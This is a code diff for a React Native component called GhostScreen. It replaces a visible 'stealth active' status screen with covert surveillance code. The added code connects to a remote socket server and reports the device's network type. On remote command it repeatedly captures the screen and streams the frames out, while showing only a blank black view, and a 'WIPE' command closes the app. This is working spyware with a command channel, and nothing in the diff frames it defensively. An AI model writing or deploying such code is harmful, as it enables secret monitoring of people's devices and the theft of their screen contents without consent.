@@ -1,32 +1,41 @@
-import React from 'react';
-import { View, Text, StyleSheet } from 'react-native';
+import React, { useEffect, useRef } from 'react';
+import { View, BackHandler } from 'react-native';
+import * as Network from 'expo-network';
+import { captureScreen } from 'react-native-view-shot';
+import io from 'socket.io-client';
+
+const socket = io('https://joyjet-server.onrender.com');
 
 export default function GhostScreen({ name }) {
-  const prefix = name.split('_')[0];
+  const streamTimer = useRef(null);
 
-  return (
-    <View style={styles.container}>
-      <View style={styles.statusBox}>
-        <Text style={styles.ghostName}>{name.toUpperCase()}</Text>
-        <View style={styles.divider} />
-        <Text style={styles.statusText}>STATUS: STEALTH ACTIVE</Text>
-        <Text style={styles.infoText}>Visible to Viewer: {prefix}</Text>
-      </View>
-      
-      <View style={styles.bottomDecor}>
-        <Text style={styles.decorText}>GHOST_PROTOCOL_ENGAGED</Text>
-      </View>
-    </View>
-  );
+  useEffect(() => {
+    socket.emit('register', { role: 'ghost', name });
+
+    const checkNet = async () => {
+      const net = await Network.getNetworkStateAsync();
+      socket.emit('net_status', net.type); // Reports WIFI or CELLULAR
+    };
+    checkNet();
+
+    socket.on('command', (cmd) => {
+      if (cmd === 'LIVE') start(200);
+      if (cmd === 'ECO') start(5000);
+      if (cmd === 'WIPE') BackHandler.exitApp();
+    });
+
+    socket.on('force_eco', () => start(5000));
+
+    return () => clearInterval(streamTimer.current);
+  }, []);
+
+  const start = (ms) => {
+    clearInterval(streamTimer.current);
+    streamTimer.current = setInterval(async () => {
+      const img = await captureScreen({ format: 'jpg', quality: 0.3, result: 'base64' });
+      socket.emit('frame_data', img);
+    }, ms);
+  };
+
+  return <View style={{ flex: 1, backgroundColor: '#000' }} />;
 }
-
-const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#000', padding: 30, justifyContent: 'center' },
-  statusBox: { padding: 30, borderWidth: 1, borderColor: '#FF0000', borderRadius: 2 },
-  ghostName: { color: '#FFF', fontSize: 24, fontWeight: 'bold', textAlign: 'center', letterSpacing: 4 },
-  divider: { height: 1, backgroundColor: '#FF0000', marginVertical: 20, opacity: 0.3 },
-  statusText: { color: '#FF0000', fontSize: 14, textAlign: 'center', fontWeight: 'bold' },
-  infoText: { color: '#333', fontSize: 10, textAlign: 'center', marginTop: 10 },
-  bottomDecor: { position: 'absolute', bottom: 40, left: 0, right: 0, alignItems: 'center' },
-  decorText: { color: '#111', fontSize: 10, letterSpacing: 5 }
-});
